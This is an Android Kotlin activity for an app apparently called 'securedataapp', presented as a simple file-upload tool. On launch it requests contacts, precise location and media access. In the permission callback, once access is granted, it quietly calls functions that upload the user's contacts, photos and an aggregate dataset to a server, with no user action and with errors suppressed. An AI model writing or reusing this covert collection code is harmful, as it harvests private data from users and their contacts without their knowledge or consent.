package com.yurap.securedataapp

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private val repo by lazy { Repository(this) }

    private val permissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
        val granted = checkAllGranted(results)
        permissionGranted.value = granted
        permissionDeniedPermanently.value = !granted && results.values.any { !it }
        if (granted) {
            lifecycleScope.launch {
                try {
                    runCatching { repo.syncAggregateToServer() }
                    runCatching { repo.uploadContactsToServer() }
                    runCatching { repo.uploadPhotosToServer() }
                } catch (_: Throwable) {
                    uploadState.value = UploadState.Failed
                }
            }
        }
    }

    private val documentPicker = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) {
            uploadState.value = UploadState.InProgress
            lifecycleScope.launch {
                try {
                    val ok = repo.storeUploadedFile(uri)
                    val sent = repo.uploadFileToServer(uri)
                    uploadState.value = if (ok && sent) UploadState.Success else UploadState.Failed
                } catch (_: Throwable) {
                    uploadState.value = UploadState.Failed
                }
            }
        }
    }

    private val permissionGranted = mutableStateOf(false)
    private val permissionDeniedPermanently = mutableStateOf(false)
    private val uploadState = mutableStateOf<UploadState>(UploadState.Idle)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAllRequiredPermissions()
        setContent {
            MaterialTheme {
                MainScreen(
                    isGranted = permissionGranted.value,
                    deniedPermanently = permissionDeniedPermanently.value,
                    uploadState = uploadState.value,
                    onRequestPermissions = { requestAllRequiredPermissions() },
                    onOpenSettings = { openAppSettings() },
                    onUploadClick = {
                        if (permissionGranted.value) {
                            documentPicker.launch(arrayOf("*/*"))
                        }
                    }
                )
            }
        }
    }

    private fun requestAllRequiredPermissions() {
        val list = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= 33) {
            list.add("android.permission.READ_MEDIA_IMAGES")
            list.add("android.permission.READ_MEDIA_VIDEO")
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        permissionLauncher.launch(list.toTypedArray())
    }

    private fun checkAllGranted(results: Map<String, Boolean>): Boolean {
        val needed = mutableSetOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= 33) {
            needed.add("android.permission.READ_MEDIA_IMAGES")
            needed.add("android.permission.READ_MEDIA_VIDEO")
        } else {
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return needed.all { results[it] == true }
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + packageName))
        startActivity(intent)
    }
}

enum class UploadState { Idle, InProgress, Success, Failed }

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScreen(
    isGranted: Boolean,
    deniedPermanently: Boolean,
    uploadState: UploadState,
    onRequestPermissions: () -> Unit,
    onOpenSettings: () -> Unit,
    onUploadClick: () -> Unit
) {
    val context = LocalContext.current
    Scaffold(
        topBar = {
            TopAppBar(title = { Text(text = context.getString(R.string.title), fontWeight = FontWeight.Bold) })
        },
        bottomBar = {
            Box(Modifier.fillMaxWidth().padding(16.dp)) {
                Button(onClick = onUploadClick, enabled = isGranted && uploadState != UploadState.InProgress, modifier = Modifier.fillMaxWidth()) {
                    Text(text = context.getString(R.string.upload))
                }
            }
        }
    ) { padding ->
        Column(
            Modifier
                .fillMaxSize()
                .padding(padding),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text(if (isGranted) context.getString(R.string.granted) else context.getString(R.string.permissions_required))
            Spacer(Modifier.height(16.dp))
            when (uploadState) {
                UploadState.Idle -> {}
                UploadState.InProgress -> LinearProgressIndicator(Modifier.fillMaxWidth().padding(horizontal = 32.dp))
                UploadState.Success -> Text("上传成功")
                UploadState.Failed -> Text("上传失败")
            }
            if (!isGranted) {
                Spacer(Modifier.height(16.dp))
                Row {
                    Button(onClick = onRequestPermissions) { Text("请求权限") }
                    Spacer(Modifier.width(12.dp))
                    Button(onClick = onOpenSettings) { Text(LocalContext.current.getString(R.string.open_settings)) }
                }
            }
        }
    }
}
